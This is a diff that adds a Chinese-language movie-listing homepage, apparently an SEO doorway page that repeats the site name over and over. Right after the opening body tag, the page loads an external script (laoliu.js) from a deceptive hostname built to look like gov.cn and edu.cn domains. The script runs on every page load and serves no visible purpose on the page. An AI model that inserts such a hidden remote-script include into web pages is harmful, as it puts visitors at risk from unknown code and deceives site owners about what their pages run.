@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>老司机电影网 - 热门电影在线观看 | laosijidianyingwangnidongde-h5.github.io</title>
+<meta name="description" content="老司机电影网提供最新热门电影、高清影视资源在线观看，涵盖动作、喜剧、科幻、爱情等多种类型，老司机电影网是您追剧观影的首选平台。">
+<meta name="keywords" content="老司机电影网,电影在线观看,热门电影,高清影视,电影推荐,laosijidianyingwangnidongde-h5">
+<meta name="author" content="老司机电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://laosijidianyingwangnidongde-h5.github.io/">
+<!-- 必应站长验证预留 -->
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE_PLACEHOLDER" />
+<!-- Open Graph -->
+<meta property="og:title" content="老司机电影网 - 热门电影在线观看">
+<meta property="og:description" content="老司机电影网提供最新热门电影、高清影视资源在线观看。">
+<meta property="og:url" content="https://laosijidianyingwangnidongde-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="老司机电影网">
+<!-- 结构化数据 -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "老司机电影网",
+  "url": "https://laosijidianyingwangnidongde-h5.github.io/",
+  "description": "老司机电影网提供最新热门电影、高清影视资源在线观看",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://laosijidianyingwangnidongde-h5.github.io/#search={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+/* ===== 全局重置与基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:#0a0a1a;
+  color:#e0e0e0;
+  line-height:1.6;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;transition:color .3s}
+img{max-width:100%;height:auto;display:block}
+ul,ol{list-style:none}
+
+/* ===== 头部导航 ===== */
+.header{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(10,10,26,.95);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(255,255,255,.08);
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 1rem;height:60px;
+}
+.logo{
+  font-size:1.3rem;font-weight:800;
+  background:linear-gradient(135deg,#ff6b35,#f7c948);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.nav-menu{display:flex;gap:.5rem}
+.nav-menu a{
+  padding:.5rem .8rem;border-radius:6px;
+  font-size:.9rem;font-weight:500;
+  color:#ccc;
+}
+.nav-menu a:hover{background:rgba(255,107,53,.15);color:#ff6b35}
+.menu-toggle{display:none;flex-direction:column;cursor:pointer;gap:4px}
+.menu-toggle span{display:block;width:24px;height:3px;background:#ff6b35;border-radius:2px}
+
+/* ===== Hero 区域 ===== */
+.hero{
+  margin-top:60px;
+  min-height:80vh;
+  display:flex;align-items:center;justify-content:center;
+  text-align:center;
+  background:radial-gradient(ellipse at top,rgba(255,107,53,.15),transparent 60%),
+              radial-gradient(ellipse at bottom,rgba(247,201,72,.08),transparent 60%);
+  padding:2rem 1rem;
+}
+.hero-content{max-width:800px}
+.hero-badge{
+  display:inline-block;padding:.4rem 1rem;
+  background:rgba(255,107,53,.15);border:1px solid rgba(255,107,53,.3);
+  border-radius:20px;font-size:.8rem;color:#ff6b35;margin-bottom:1.5rem;
+}
+.hero h1{
+  font-size:clamp(2rem,5vw,3.5rem);font-weight:900;
+  line-height:1.2;margin-bottom:1rem;
+}
+.hero h1 span{color:#ff6b35}
+.hero p{font-size:1.1rem;color:#aaa;margin-bottom:2rem;max-width:600px;margin-left:auto;margin-right:auto}
+.hero-cta{
+  display:inline-flex;align-items:center;gap:.5rem;
+  padding:.9rem 2rem;
+  background:linear-gradient(135deg,#ff6b35,#f7c948);
+  color:#000;font-weight:700;border-radius:50px;
+  box-shadow:0 4px 20px rgba(255,107,53,.35);
+}
+.hero-cta:hover{transform:translateY(-2px);box-shadow:0 6px 30px rgba(255,107,53,.5)}
+
+/* ===== 栏目一：最新上映 ===== */
+.section-latest{
+  padding:4rem 1rem;
+  background:#0f0f24;
+}
+.section-header{
+  text-align:center;margin-bottom:3rem;
+}
+.section-header h2{
+  font-size:clamp(1.5rem,4vw,2.5rem);font-weight:800;
+  margin-bottom:.5rem;
+}
+.section-header h2 span{color:#ff6b35}
+.section-header p{color:#888;font-size:.95rem}
+.latest-grid{
+  max-width:1200px;margin:0 auto;
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:1.5rem;
+}
+.latest-card{
+  background:#16162e;border-radius:12px;overflow:hidden;
+  transition:transform .3s,box-shadow .3s;
+}
+.latest-card:hover{transform:translateY(-5px);box-shadow:0 10px 30px rgba(255,107,53,.2)}
+.latest-card .poster{
+  height:280px;background:linear-gradient(135deg,#2a2a5a,#1a1a3e);
+  display:flex;align-items:center;justify-content:center;
+  font-size:3rem;
+}
+.latest-card .info{padding:1rem}
+.latest-card .info h3{font-size:1rem;margin-bottom:.3rem;color:#fff}
+.latest-card .info .meta{font-size:.8rem;color:#888;display:flex;justify-content:space-between}
+
+/* ===== 栏目二：电影分类 ===== */
+.section-categories{
+  padding:4rem 1rem;
+  background:#0a0a1a;
+}
+.cat-container{max-width:1200px;margin:0 auto}
+.cat-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+  gap:1rem;
+}
+.cat-item{
+  position:relative;overflow:hidden;
+  border-radius:12px;height:120px;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,rgba(255,107,53,.2),rgba(247,201,72,.1));
+  border:1px solid rgba(255,107,53,.2);
+  transition:all .3s;
+}
+.cat-item:hover{border-color:rgba(255,107,53,.5);transform:scale(1.03)}
+.cat-item .icon{font-size:2rem;margin-bottom:.5rem}
+.cat-item h3{font-size:.9rem;font-weight:600;color:#fff}
+.cat-item .count{font-size:.75rem;color:#ff6b35;margin-top:.2rem}
+
+/* ===== 栏目三：排行榜 ===== */
+.section-ranking{
+  padding:4rem 1rem;
+  background:#0f0f24;
+}
+.rank-container{max-width:1200px;margin:0 auto}
+.rank-list{display:flex;flex-direction:column;gap:1rem}
+.rank-item{
+  display:flex;align-items:center;gap:1rem;
+  background:#16162e;border-radius:12px;padding:1rem;
+  transition:background .3s;
+}
+.rank-item:hover{background:#1a1a3e}
+.rank-num{
+  width:40px;height:40px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-size:1.1rem;flex-shrink:0;
+}
+.rank-1{background:linear-gradient(135deg,#ffd700,#ff6b35);color:#000}
+.rank-2{background:linear-gradient(135deg,#c0c0c0,#888);color:#000}
+.rank-3{background:linear-gradient(135deg,#cd7f32,#a0522d);color:#fff}
+.rank-other{background:#222;color:#888}
+.rank-info{flex:1}
+.rank-info h3{font-size:1rem;color:#fff;margin-bottom:.2rem}
+.rank-info p{font-size:.8rem;color:#888}
+.rank-score{
+  font-size:1.5rem;font-weight:800;color:#ff6b35;flex-shrink:0;
+}
+
+/* ===== 栏目四：关于我们 ===== */
+.section-about{
+  padding:4rem 1rem;
+  background:#0a0a1a;
+}
+.about-container{max-width:800px;margin:0 auto;text-align:center}
+.about-container h2{font-size:clamp(1.5rem,4vw,2.5rem);margin-bottom:1.5rem}
+.about-container h2 span{color:#ff6b35}
+.about-text{
+  font-size:1rem;color:#aaa;margin-bottom:2rem;
+  line-height:1.8;
+}
+.about-features{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:1.5rem;margin-top:2rem;
+}
+.feature-card{
+  background:#16162e;border-radius:12px;padding:1.5rem;
+  border:1px solid rgba(255,255,255,.05);
+}
+.feature-card .icon{font-size:2rem;margin-bottom:.8rem}
+.feature-card h3{font-size:1rem;color:#fff;margin-bottom:.5rem}
+.feature-card p{font-size:.85rem;color:#888}
+
+/* ===== 页脚 ===== */
+.footer{
+  padding:2rem 1rem;
+  background:#060612;
+  border-top:1px solid rgba(255,255,255,.05);
+  text-align:center;
+}
+.footer p{font-size:.85rem;color:#666;margin-bottom:.5rem}
+.footer a{color:#ff6b35}
+.footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-bottom:1rem;flex-wrap:wrap}
+.footer .footer-links a{font-size:.85rem;color:#888}
+.footer .footer-links a:hover{color:#ff6b35}
+
+/* ===== 移动端自适应 ===== */
+@media(max-width:768px){
+  .nav-menu{
+    display:none;position:absolute;top:60px;left:0;right:0;
+    background:rgba(10,10,26,.98);
+    flex-direction:column;padding:1rem;
+    border-bottom:1px solid rgba(255,255,255,.08);
+  }
+  .nav-menu.active{display:flex}
+  .nav-menu a{text-align:center;padding:.8rem}
+  .menu-toggle{display:flex}
+  .hero{min-height:70vh}
+  .latest-grid{grid-template-columns:repeat(2,1fr);gap:1rem}
+  .latest-card .poster{height:220px}
+  .cat-grid{grid-template-columns:repeat(2,1fr)}
+  .rank-item{flex-wrap:wrap}
+  .rank-score{width:100%;text-align:right}
+  .about-features{grid-template-columns:1fr}
+}
+@media(max-width:480px){
+  .latest-grid{grid-template-columns:1fr}
+  .cat-grid{grid-template-columns:1fr}
+  .hero h1{font-size:1.8rem}
+  .hero p{font-size:.95rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- ===== 头部导航 ===== -->
+<header class="header">
+  <div class="nav-container">
+    <div class="logo">🎬 老司机电影网</div>
+    <nav class="nav-menu" id="navMenu">
+      <a href="#latest">最新上映</a>
+      <a href="#categories">电影分类</a>
+      <a href="#ranking">排行榜</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="menu-toggle" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<!-- ===== Hero 区域 ===== -->
+<section class="hero">
+  <div class="hero-content">
+    <div class="hero-badge">🔥 老司机电影网 · 热门影视聚合</div>
+    <h1>欢迎来到 <span>老司机电影网</span></h1>
+    <p>老司机电影网为您精选全球热门电影、高分大片、经典佳作，随时随地畅享高清观影体验。老司机电影网——懂电影，更懂你。</p>
+    <a href="#latest" class="hero-cta">🎬 立即探索</a>
+  </div>
+</section>
+
+<!-- ===== 栏目一：最新上映 ===== -->
+<section class="section-latest" id="latest">
+  <div class="section-header">
+    <h2>📽️ <span>最新上映</span></h2>
+    <p>老司机电影网每日更新，第一时间为您推荐最新热门影片</p>
+  </div>
+  <div class="latest-grid">
+    <div class="latest-card">
+      <div class="poster">🎬</div>
+      <div class="info">
+        <h3>沙丘3：预言</h3>
+        <div class="meta"><span>科幻</span><span>2026</span></div>
+      </div>
+    </div>
+    <div class="latest-card">
+      <div class="poster">🎬</div>
+      <div class="info">
+        <h3>疾速追杀5</h3>
+        <div class="meta"><span>动作</span><span>2026</span></div>
+      </div>
+    </div>
+    <div class="latest-card">
+      <div class="poster">🎬</div>
+      <div class="info">
+        <h3>奥本海默2</h3>
+        <div class="meta"><span>传记</span><span>2026</span></div>
+      </div>
+    </div>
+    <div class="latest-card">
+      <div class="poster">🎬</div>
+      <div class="info">
+        <h3>蜘蛛侠：多元宇宙2</h3>
+        <div class="meta"><span>动画</span><span>2026</span></div>
+      </div>
+    </div>
+    <div class="latest-card">
+      <div class="poster">🎬</div>
+      <div class="info">
+        <h3>碟中谍8</h3>
+        <div class="meta"><span>动作</span><span>2025</span></div>
+      </div>
+    </div>
+    <div class="latest-card">
+      <div class="poster">🎬</div>
+      <div class="info">
+        <h3>阿凡达3</h3>
+        <div class="meta"><span>科幻</span><span>2025</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：电影分类 ===== -->
+<section class="section-categories" id="categories">
+  <div class="section-header">
+    <h2>📂 <span>电影分类</span></h2>
+    <p>老司机电影网全品类覆盖，精准匹配您的观影偏好</p>
+  </div>
+  <div class="cat-container">
+    <div class="cat-grid">
+      <a href="#" class="cat-item">
+        <div class="icon">💥</div>
+        <h3>动作片</h3>
+        <div class="count">1280+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">😂</div>
+        <h3>喜剧片</h3>
+        <div class="count">960+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">👽</div>
+        <h3>科幻片</h3>
+        <div class="count">750+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">💕</div>
+        <h3>爱情片</h3>
+        <div class="count">1100+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">😱</div>
+        <h3>恐怖片</h3>
+        <div class="count">520+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">🎭</div>
+        <h3>剧情片</h3>
+        <div class="count">1500+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">🎨</div>
+        <h3>动画片</h3>
+        <div class="count">680+ 部</div>
+      </a>
+      <a href="#" class="cat-item">
+        <div class="icon">📜</div>
+        <h3>历史片</h3>
+        <div class="count">430+ 部</div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：排行榜 ===== -->
+<section class="section-ranking" id="ranking">
+  <div class="section-header">
+    <h2>🏆 <span>热门排行榜</span></h2>
+    <p>老司机电影网用户真实评分，每周更新 TOP 10</p>
+  </div>
+  <div class="rank-container">
+    <div class="rank-list">
+      <div class="rank-item">
+        <div class="rank-num rank-1">1</div>
+        <div class="rank-info">
+          <h3>沙丘2</h3>
+          <p>科幻 · 2024 · 导演：丹尼斯·维伦纽瓦</p>
+        </div>
+        <div class="rank-score">9.4</div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num rank-2">2</div>
+        <div class="rank-info">
+          <h3>奥本海默</h3>
+          <p>传记 · 2023 · 导演：克里斯托弗·诺兰</p>
+        </div>
+        <div class="rank-score">9.2</div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num rank-3">3</div>
+        <div class="rank-info">
+          <h3>蜘蛛侠：纵横宇宙</h3>
+          <p>动画 · 2023 · 导演：乔伊姆·多斯·桑托斯</p>
+        </div>
+        <div class="rank-score">9.0</div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num rank-other">4</div>
+        <div class="rank-info">
+          <h3>坠落的审判</h3>
+          <p>剧情 · 2023 · 导演：茹斯汀·特里耶</p>
+        </div>
+        <div class="rank-score">8.8</div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num rank-other">5</div>
+        <div class="rank-info">
+          <h3>美国小说</h3>
+          <p>喜剧 · 2023 · 导演：Cord Jefferson</p>
+        </div>
+        <div class="rank-score">8.6</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：关于我们 ===== -->
+<section class="section-about" id="about">
+  <div class="about-container">
+    <h2>🎬 关于 <span>老司机电影网</span></h2>
+    <p class="about-text">
+      老司机电影网（laosijidianyingwangnidongde-h5.github.io）是一个专注于电影推荐与影视资源聚合的在线平台。
+      我们致力于为影迷提供最新、最全、最优质的电影资讯和观影指南。
+      老司机电影网团队由资深影评人和技术开发者组成，用心筛选每一部佳作，
+      让每一位访问老司机电影网的用户都能找到心仪的影片。
+    </p>
+    <div class="about-features">
+      <div class="feature-card">
+        <div class="icon">⚡</div>
+        <h3>极速更新</h3>
+        <p>老司机电影网每日同步全球最新上映影片信息</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🎯</div>
+        <h3>精准推荐</h3>
+        <p>基于用户偏好，老司机电影网智能匹配观影清单</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">📱</div>
+        <h3>多端适配</h3>
+        <p>老司机电影网完美适配手机、平板、桌面端</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="footer">
+  <div class="footer-links">
+    <a href="#latest">最新上映</a>
+    <a href="#categories">电影分类</a>
+    <a href="#ranking">排行榜</a>
+    <a href="#about">关于我们</a>
+    <a href="#">免责声明</a>
+    <a href="#">隐私政策</a>
+  </div>
+  <p>© 2026 <a href="https://laosijidianyingwangnidongde-h5.github.io">老司机电影网</a> (laosijidianyingwangnidongde-h5.github.io). All rights reserved.</p>
+  <p>老司机电影网 · 您的专属观影指南 · 老司机电影网用心服务每一位影迷</p>
+</footer>
+
+<script>
+function toggleMenu(){
+  var menu = document.getElementById('navMenu');
+  menu.classList.toggle('active');
+}
+// 平滑滚动关闭移动端菜单
+document.querySelectorAll('.nav-menu a').forEach(function(link){
+  link.addEventListener('click',function(){
+    document.getElementById('navMenu').classList.remove('active');
+  });
+});
+</script>
+
+</body>
+</html>
